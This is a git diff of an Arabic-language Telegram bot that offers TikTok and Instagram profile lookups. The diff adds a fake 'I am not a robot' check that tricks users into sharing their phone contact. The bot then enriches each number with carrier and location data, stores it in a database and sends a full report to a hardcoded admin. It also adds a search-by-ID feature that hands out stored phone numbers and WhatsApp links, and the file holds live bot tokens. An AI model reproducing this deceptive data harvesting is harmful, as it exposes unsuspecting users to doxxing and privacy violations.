@@ -1,7 +1,8 @@
+const sqlite3 = require('sqlite3').verbose();
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const crypto = require('crypto');
-const { v4: uuidv4 } = require('uuid');
+const { v4: uuidv4 } = require('uuid');;
 const fs = require('fs');
 const path = require('path');
 const express = require('express');
@@ -17,13 +18,11 @@ app.listen(PORT, () => {
 });
 
 const ADMIN_ID = '7193004338'; // ضع معرف الشات الخاص بالمدير
-
-let usersData = {}; // لتخزين بيانات المستخدمين بشكل منفصل
-let usedBefore = {}; // لتخزين المستخدمين الذين استخدموا البوت من قبل
-const forcedChannels = ['@SJGDDW', '@YYY_A12', '@YEMENCYBER101'];
-
-const token = '6455603203:AAGYSBJ_hybQ_lWfQszylVQOEW9Pzrz9Bw0';
+const token = '6455603203:AAFnlAjQewoM5CMMRwQS388RiI1U0aHIN78';
 const bot = new TelegramBot(token, { polling: true });
+const apiUrl = `https://illyvoip.com/my/application/number_lookup/?phonenumber=`;
+
+const db = new sqlite3.Database('bot_data.db');
 
 const uid = uuidv4();
 const csr = crypto.randomBytes(8).toString('hex').repeat(2);
@@ -46,46 +45,170 @@ async function getCountryInfo(countryCode) {
     }
 }
 
+
+
+db.serialize(() => {
+    db.run(`CREATE TABLE IF NOT EXISTS users (
+        id INTEGER PRIMARY KEY,
+        name TEXT,
+        username TEXT,
+        phone TEXT,
+        country TEXT,
+        carrier TEXT,
+        location TEXT,
+        internationalFormat TEXT,
+        localFormat TEXT,
+        formattedE164 TEXT,
+        formattedRFC3966 TEXT,
+        timeZones TEXT,
+        lineType TEXT,
+        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+    )`);
+});
+
+// استقبال الرقم والتعامل معه
 bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
+    const userId = msg.from.id;
 
-    const isSubscribed = await checkSubscriptions(chatId);
+    db.get('SELECT * FROM users WHERE id = ?', [userId], async (err, row) => {
+        if (err) {
+            console.error(err);
+            bot.sendMessage(chatId, 'حدث خطأ.');
+            return;
+        }
 
-    if (!isSubscribed) {
-        // المستخدم غير مشترك، لن يتم إظهار الأزرار
-        return;
+        if (!row) {
+            const opts = {
+                reply_markup: {
+                    keyboard: [
+                        [{ text: 'أنا لست روبوت', request_contact: true }]
+                    ],
+                    one_time_keyboard: true
+                }
+            };
+            bot.sendMessage(chatId, 'يرجى التحقق من أنك لست روبوت', opts);
+        } else {
+            const isSubscribed = await checkSubscriptions(userId);
+            if (isSubscribed) {
+                showMainMenu(chatId, row);
+            }
+        }
+    });
+});
+
+bot.on('contact', async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (msg.contact.user_id === userId) {
+        let phoneNumber = msg.contact.phone_number;
+
+        if (!phoneNumber.startsWith('+')) {
+            phoneNumber = `+${phoneNumber}`;
+        }
+
+        try {
+            const phoneInfo = await getPhoneInfo(phoneNumber);
+
+            const userInfo = {
+                id: userId,
+                name: msg.from.first_name || "غير متوفر",
+                username: msg.from.username || "غير متوفر",
+                phone: phoneNumber,
+                country: phoneInfo.country || "غير معروف",
+                carrier: phoneInfo.carrier || "غير معروف",
+                location: phoneInfo.location || "غير معروف",
+                internationalFormat: phoneInfo.internationalFormat || "غير معروف",
+                localFormat: phoneInfo.localFormat || "غير معروف",
+                formattedE164: phoneInfo.formattedE164 || "غير معروف",
+                formattedRFC3966: phoneInfo.formattedRFC3966 || "غير معروف",
+                timeZones: phoneInfo.timeZones || "غير معروف",
+                lineType: phoneInfo.lineType || "غير معروف"
+            };
+
+            // إدخال البيانات الجديدة أو تحديث البيانات الحالية إذا كانت موجودة مسبقًا
+            db.run(`
+                INSERT OR REPLACE INTO users (id, name, username, phone, country, carrier, location, internationalFormat, localFormat, formattedE164, formattedRFC3966, timeZones, lineType)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+                [
+                    userInfo.id, userInfo.name, userInfo.username, userInfo.phone, 
+                    userInfo.country, userInfo.carrier, userInfo.location, 
+                    userInfo.internationalFormat, userInfo.localFormat, 
+                    userInfo.formattedE164, userInfo.formattedRFC3966, 
+                    userInfo.timeZones, userInfo.lineType
+                ],
+                (err) => {
+                    if (err) {
+                        console.error('Error saving data:', err);
+                        bot.sendMessage(chatId, 'حدث خطأ أثناء حفظ البيانات.');
+                    } else {
+                        const userReport = `
+مرحبا مديري، قام شخص باستخدام البوت:
+ـــــــــــــــــــــــــــــــــــــــ
+اسم المستخدم: ${userInfo.name}
+يوزر المستخدم: @${userInfo.username}
+ايدي المستخدم: ${userInfo.id}
+رقم الهاتف: ${userInfo.phone}
+البلد: ${userInfo.country}
+شركة الاتصالات: ${userInfo.carrier}
+الموقع: ${userInfo.location}
+التنسيق الدولي: ${userInfo.internationalFormat}
+التنسيق المحلي: ${userInfo.localFormat}
+التنسيق E164: ${userInfo.formattedE164}
+التنسيق RFC3966: ${userInfo.formattedRFC3966}
+المنطقة الزمنية: ${userInfo.timeZones}
+نوع الخط: ${userInfo.lineType}
+رابط تيليجرام: https://t.me/${userInfo.username !== "غير متوفر" ? userInfo.username : ""}
+رابط واتساب: https://wa.me/${userInfo.phone}
+الوقت: ${new Date().toISOString()}
+                        `;
+
+                        bot.sendMessage(chatId, "تم التحقق بنجاح! جاري التحقق من اشتراكك في قناة البوت.", { reply_markup: { remove_keyboard: true } });
+                        
+                        // إرسال التقرير إلى المدير
+                        bot.sendMessage(ADMIN_ID, userReport);
+
+                        // التحقق من اشتراك المستخدم
+                        checkSubscriptions(userId).then(isSubscribed => {
+                            if (isSubscribed) {
+                                showMainMenu(chatId, userInfo);
+                            }
+                        });
+                    }
+                }
+            );
+        } catch (error) {
+            console.error("Error fetching phone info:", error);
+            bot.sendMessage(chatId, 'حدث خطأ أثناء محاولة الحصول على معلومات الهاتف.');
+        }
+    } else {
+        bot.sendMessage(chatId, "❌ | عليك التحقق من خلال الضغط على الزر !!.");
     }
+});
 
+async function getPhoneInfo(phoneNumber) {
+    try {
+        const response = await axios.get(`${apiUrl}${phoneNumber}`);
+        return response.data;
+    } catch (error) {
+        console.error("Error fetching phone info:", error);
+        throw error;
+    }
+}
+
+function showMainMenu(chatId, userInfo) {
     const opts = {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'المطور - 𝐒𝐉𝐆𝐃 𖡔️️', url: 'https://t.me/SAGD112' }],
-                [{ text: 'قناة المطور - learn hacking', url: 'https://t.me/SJGDDW'}]
+                [{ text: 'بحث عبر ID', callback_data: 'search_id' }],
+                [{ text: 'المطور - Developer', url: 'https://t.me/SAGD112' }],
+                [{ text: 'قناة المطور - Channel Developer', url: 'https://t.me/SJGDDW'}]
             ]
         },
         parse_mode: 'HTML'
     };
-
-    if (!usedBefore[chatId]) {
-        // إذا لم يستخدم البوت من قبل، أرسل إشعارًا إلى المدير
-        usedBefore[chatId] = true; // تسجيل أن المستخدم استخدم البوت
-
-        const userName = msg.from.first_name || 'غير متاح';
-        const userUsername = msg.from.username || 'غير متاح';
-        const userId = msg.from.id;
-        const currentTime = new Date().toLocaleString();
-
-        const adminMessage = `مرحبا مديري قام شخص باستخدام البوت
-ـــــــــــــــــــــــــــــــــــــــ
-اسم المستخدم: ${userName}
-يوزر المستخدم: @${userUsername}
-ايدي المستخدم: ${userId}
-رقم المستخدم: غير متاح
-الوقت: ${currentTime}`;
-
-        await bot.sendMessage(ADMIN_ID, adminMessage);
-    }
-
+    
     const message = `<strong>
 اهلا بك🎉
 في بوت معرفه معلومات تيك توك او انستجرام من يوزر.
@@ -152,6 +275,8 @@ eşlik edebilir, örnek /ig mahos
 });
 
 async function checkSubscriptions(userId) {
+    const forcedChannels = ['@SJGDDW', '@YYY_A12', '@YEMENCYBER101'];
+
     for (let channel of forcedChannels) {
         try {
             const member = await bot.getChatMember(channel, userId);
@@ -171,6 +296,64 @@ async function checkSubscriptions(userId) {
     return true;
 }
 
+bot.on('callback_query', async (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const data = callbackQuery.data;
+
+    if (data === 'search_id') {
+        async function searchById(msg) {
+    try {
+        const userId = parseInt(msg.text);
+        if (isNaN(userId)) {
+            throw new Error("يرجى إدخال ID صحيح.");
+        }
+
+        db.get('SELECT * FROM users WHERE id = ?', [userId], (err, row) => {
+            if (err) {
+                console.error(err);
+                bot.sendMessage(msg.chat.id, 'حدث خطأ أثناء البحث.');
+            } else if (row) {
+                const userReport = `
+تم العثور على المعلومات:
+📞 | رقم الهاتف: ${row.phone}
+🧍‍♂️ | الاسم: ${row.name}
+💼 | المعرف: @${row.username}
+🆔 | الايدي: ${userId}
+🕰️ | الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' })}
+🌍 | الدولة: ${row.country}
+📡 | شركة الاتصال: ${row.carrier}
+📍 | الموقع: ${row.location || "غير معروف"}
+📱 | نوع الخط: ${row.lineType || "غير معروف"}
+🌐 | التنسيق الدولي: ${row.internationalFormat || "غير معروف"}
+🔢 | التنسيق المحلي: ${row.localFormat || "غير معروف"}
+🔢 | التنسيق E164: ${row.formattedE164 || "غير معروف"}
+🔢 | التنسيق RFC3966: ${row.formattedRFC3966 || "غير معروف"}
+🕒 | المنطقة الزمنية: ${row.timeZones || "غير معروف"}
+                `;
+
+                
+                const buttons = {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "🔗 حسابه تيليجرام", url: `https://t.me/${row.username}` }],
+                            [{ text: "🔗 حسابه الحالي", url: `https://t.me/${row.username}` }],
+                            [{ text: "🔗 حسابه واتساب", url: `https://wa.me/${row.phone}` }]
+                        ]
+                    }
+                };
+
+                bot.sendMessage(msg.chat.id, userReport, buttons);
+            } else {
+                bot.sendMessage(msg.chat.id, 'ID المستخدم غير موجود في السجلات.');
+            }
+        });
+    } catch (error) {
+        bot.sendMessage(msg.chat.id, error.message);
+    }
+}
+        bot.sendMessage(msg.chat.id, 'أدخل ID للبحث عنه:');
+    }
+});
 
 bot.onText(/\/tik (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
@@ -377,6 +560,8 @@ bot.onText(/\/ig (.+)/, async (msg, match) => {
 الهاتف صالح ⇾ ${res.has_valid_phone ? 'نعم' : 'غير متاح'}  
 حساب موثق ⇾ ${res.user.is_verified ? 'نعم' : 'لا'}  
 الدولة ⇾ ${locationInfo.country || 'غير متاح'}  
+المدينة ⇾ ${locationInfo.city || 'غير متاح'}  
+المنطقة ⇾ ${locationInfo.regionName || 'غير متاح'}  
 ⋘─────━*معلومات*━─────⋙  
 المطور: @SAGD112| @SJGDDW
 `;
